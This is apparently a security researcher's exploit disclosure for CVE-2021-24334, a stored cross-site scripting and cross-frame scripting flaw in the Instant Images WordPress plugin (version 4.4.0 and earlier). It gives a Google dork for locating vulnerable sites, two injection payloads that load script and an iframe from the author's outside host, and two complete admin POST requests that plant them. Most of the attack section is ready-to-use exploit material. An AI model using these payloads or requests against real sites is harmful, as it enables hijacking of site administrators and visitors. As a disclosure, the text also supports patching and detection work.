/*!
- # VULNERABILITY: Instant Images WordPress Plugin <= 4.4.0 - Authenticated Persistent XSS & XFS
- # GOOGLE DORK: inurl:/wp-content/plugins/instant-images/
- # DATE: 2021-04-22
- # SECURITY RESEARCHER: m0ze [ https://m0ze.ru ]
- # VENDOR: Darren Cooney [ https://connekthq.com ]
- # SOFTWARE VERSION: <= 4.4.0
- # SOFTWARE LINK: https://wordpress.org/plugins/instant-images/
- # CVSS: AV:N/AC:L/PR:H/UI:N/S:C
- # CWE: CWE-79
- # CVE: CVE-2021-24334
*/



### -- [ Info: ]

[i] An Authenticated Persistent XSS & XFS vulnerabilities was discovered in the Instant Images plugin through v4.4.0 for WordPress.

[i] Vulnerable parameter(s): $options['unsplash_download_w'] (instant-images/instant-images.php:164), $options['unsplash_download_h'] (instant-images/instant-images.php:165).



### -- [ Impact: ]

[~] Malicious JavaScript code or iFrame injections, the ability to combine attack vectors against the targeted system, which can lead to a complete compromise of the resource.



### -- [ Payloads: ]

[$] "><script src=//m0ze.ru/payload/a.js></script><div x

[$] "><iframe src=https://m0ze.ru/payload/xfsii.html></iframe><div x



### -- [ PoC #1 | Authenticated Persistent XSS & XFS | Max Image Upload Width: ]

[!] POST /wp-admin/options.php HTTP/2
Host: example.com
Cookie: [admin cookies]
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 361

option_page=instant-img-setting-group&action=update&_wpnonce=84d90e991d&_wp_http_referer=%2Fwp-admin%2Fupload.php%3Fpage%3Dinstant-images&instant_img_settings%5Bunsplash_download_w%5D=%22%3E%3Cscript+src%3D%2F%2Fm0ze.ru%2Fpayload%2Fa.js%3E%3C%2Fscript%3E%3Cdiv+x&instant_img_settings%5Bunsplash_download_h%5D=1337&instant_img_settings%5Bmedia_modal_display%5D=0



### -- [ PoC #2 | Authenticated Persistent XSS & XFS | Max Image Upload Height: ]

[!] POST /wp-admin/options.php HTTP/2
Host: example.com
Cookie: [admin cookies]
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 375

option_page=instant-img-setting-group&action=update&_wpnonce=84d90e991d&_wp_http_referer=%2Fwp-admin%2Fupload.php%3Fpage%3Dinstant-images&instant_img_settings%5Bunsplash_download_w%5D=1337&instant_img_settings%5Bunsplash_download_h%5D=%22%3E%3Ciframe+src%3Dhttps%3A%2F%2Fm0ze.ru%2Fpayload%2Fxfsii.html%3E%3C%2Fiframe%3E%3Cdiv+x&instant_img_settings%5Bmedia_modal_display%5D=0



### -- [ Contacts: ]

[+] Website: m0ze.ru
[+] GitHub: @m0ze
[+] Telegram: @m0ze_ru
[+] Twitter: @vladm0ze
